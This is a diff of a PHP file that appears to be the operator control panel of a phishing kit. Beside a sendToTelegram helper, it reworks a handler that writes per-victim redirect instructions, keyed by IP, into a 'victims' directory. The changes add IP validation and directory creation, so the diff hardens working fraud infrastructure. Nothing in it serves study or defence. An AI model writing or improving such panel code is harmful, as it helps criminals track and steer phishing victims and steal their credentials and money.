@@ -19,25 +19,28 @@ function sendToTelegram($message) {
 
 // معالجة التحكم
 
-if (isset($_POST['step']) && $_POST['step'] == "control") {
-    // Also validate required fields to avoid further warnings
+if (isset($_POST['step']) && $_POST['step'] === 'control') {
     if (!isset($_POST['ip']) || !isset($_POST['to'])) {
-        // Handle missing data (optional: redirect with error message)
-        die("Missing required parameters.");
+        die('Missing parameters');
     }
-    
-    $filepath = 'victims/' . $_POST['ip'] . '.txt';
-    // Optional: basic sanitization to prevent directory traversal
-    $filepath = str_replace(['..', '/', '\\'], '', $filepath);
-    
-    $fp = fopen($filepath, 'wb');
-    if ($fp) {
-        fwrite($fp, $_POST['to']);
-        fclose($fp);
+    $ip = filter_var($_POST['ip'], FILTER_VALIDATE_IP);
+    if ($ip === false) {
+        die('Invalid IP');
     }
-    
-    header("location: control.php?ip=" . urlencode($_POST['ip']));
-    exit();
+    $to = $_POST['to'];
+
+    // Ensure directory exists
+    $dir = __DIR__ . '/victims/';
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+
+    $filepath = $dir . $ip . '.txt';
+    file_put_contents($filepath, $to);
+
+    // Redirect back to control panel (if you wish)
+    header('Location: control.php?ip=' . urlencode($ip));
+    exit;
 }
 
 // معالجة إعادة التوجيه
